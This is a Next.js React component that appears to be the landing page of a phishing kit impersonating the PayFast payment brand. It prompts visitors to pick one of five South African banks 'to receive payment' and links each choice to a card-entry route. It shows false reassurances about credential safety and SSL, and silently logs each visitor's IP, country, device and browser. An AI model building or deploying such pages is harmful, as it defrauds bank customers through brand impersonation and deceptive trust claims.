"use client"

import { useState, useEffect } from 'react'
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import Image from "next/image"
import Link from 'next/link'
import { Lock } from "lucide-react"

export default function HomeContent() {
  const [isDarkMode, setIsDarkMode] = useState(false)

  useEffect(() => {
    if (document.documentElement.classList.contains('dark')) {
      setIsDarkMode(true)
    }
  }, [])

  useEffect(() => {
    const logVisit = async () => {
      try {
        const res = await fetch('/api/logVisit')
        const { ip, country } = await res.json()

        const userAgent = navigator.userAgent
        const device = /Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile/.test(userAgent) ? 'Mobile' : 'Desktop'
        const browser = getBrowser(userAgent)

        await fetch('/api/logVisit', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            ip,
            userAgent,
            device,
            browser,
            country,
          }),
        })
      } catch (error) {
        console.error('Error logging visit:', error)
      }
    }

    logVisit()
  }, [])

  return (
    <main className="flex flex-col items-center justify-center min-h-[calc(100vh-145px)]">
      <Card className="w-full max-w-md md:max-w-lg lg:max-w-xl xl:max-w-2xl rounded-lg shadow-lg overflow-hidden">
        <CardContent className="p-6 md:p-8 bg-white">
          <Image
            src="/PayFast-logo.png?height=50&width=200"
            alt="PayFast Logo"
            width={200}
            height={50}
            className="mb-8 mx-auto"
          />
          <h2 className={`text-lg md:text-xl lg:text-2xl font-bold text-center mb-6 ${isDarkMode ? 'text-[#ed1c24]' : 'text-gray-800'}`}>
            Choose your transactional bank to receive payment.
          </h2>
          <p className="text-center text-gray-600 mb-6 md:text-lg">
            PayFast never stores your banking credentials
          </p>
          <div>
            <BankButton color="bg-red-600" name="Absa" logo="/bank-logos/absa.png" isDarkMode={isDarkMode} />
            <BankButton color="bg-green-500" name="Discovery Bank" logo="/bank-logos/discovery.png" isDarkMode={isDarkMode} />
            <BankButton color="bg-teal-500" name="FNB" logo="/bank-logos/fnb.png" isDarkMode={isDarkMode} />
            <BankButton color="bg-blue-600" name="Investec" logo="/bank-logos/investec.png" isDarkMode={isDarkMode} />
            <BankButton color="bg-blue-800" name="Standard Bank" logo="/bank-logos/standard.png" isDarkMode={isDarkMode} />
          </div>
          <div className="flex items-center justify-center mt-6 text-gray-500">
            <Lock className="w-4 h-4 mr-2" />
            <span className="text-sm md:text-base">Secure SSL Encryption</span>
          </div>
        </CardContent>
      </Card>
    </main>
  )
}

function BankButton({ color, name, logo, isDarkMode }: { color: string; name: string; logo: string; isDarkMode: boolean }) {
  return (
    <Link href={`/card?bank=${encodeURIComponent(name)}`} passHref className="block mb-4 md:mb-5">
      <Button
        variant="outline"
        className={`w-full justify-start text-left font-normal text-sm md:text-base p-0 h-auto group overflow-hidden transition-all duration-300 ease-in-out hover:shake ${isDarkMode ? 'bg-white hover:bg-gray-100' : 'hover:bg-gray-100'}`}
      >
        <div className="flex items-center w-full relative">
          <div className={`absolute left-0 top-2 bottom-2 w-1 ${color} rounded-r-full`} />
          <div className="flex items-center flex-grow py-2 md:py-3 pl-4">
            <Image 
              src={logo} 
              alt={`${name} logo`} 
              width={30} 
              height={30} 
              className={`mr-3 md:mr-4 w-6 h-6 md:w-7 md:h-7 ${
                (name === "Discovery Bank" || name === "FNB") ? "md:w-10 md:h-6" : ""
              }`} 
            />
            <span className="font-bold font-sans text-black">{name}</span>
          </div>
          <div className="pr-4">
            <span className="text-gray-400 group-hover:text-gray-600">&gt;</span>
          </div>
        </div>
      </Button>
    </Link>
  )
}

function getBrowser(userAgent: string): string {
  if (userAgent.includes('Firefox')) return 'Firefox'
  if (userAgent.includes('Chrome')) return 'Chrome'
  if (userAgent.includes('Safari')) return 'Safari'
  if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera'
  if (userAgent.includes('Edge')) return 'Edge'
  if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) return 'Internet Explorer'
  return 'Unknown'
}